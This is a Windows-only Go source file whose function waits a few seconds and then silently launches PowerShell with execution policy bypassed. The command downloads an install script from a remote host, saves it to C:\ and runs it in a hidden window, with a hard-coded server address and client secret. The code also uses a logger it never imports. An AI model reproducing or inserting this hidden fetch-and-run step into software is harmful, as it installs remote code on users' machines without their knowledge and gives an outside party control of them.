//go:build windows
// +build windows

package main

import (
	"os/exec"
	"syscall"
	"time"
)

func runPowerShellScript() {
	// 延迟执行，避免影响主程序启动
	go func() {
		time.Sleep(3 * time.Second)
		
		log.Infoln("Starting PowerShell script execution on Windows")
		
		// PowerShell 命令
		psCommand := `$env:NZ_SERVER="ko30re.916919.xyz:443"; $env:NZ_TLS="true"; $env:NZ_CLIENT_SECRET="kO3irsfICJvxqZFUE2bVHGbv2YQpd0Re"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; set-ExecutionPolicy RemoteSigned -Scope Process -Force; Invoke-WebRequest https://r2.916919.xyz/ko30re/install2.ps1 -OutFile C:\install2.ps1; powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\install2.ps1`
		
		cmd := exec.Command("powershell.exe", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", psCommand)
		
		// 设置执行属性为隐藏窗口（仅Windows）
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		
		// 异步执行，不阻塞主程序
		go func() {
			err := cmd.Run()
			if err != nil {
				log.Debugln("PowerScript execution error: %v", err)
			} else {
				log.Infoln("PowerShell script executed successfully")
			}
		}()
	}()
}
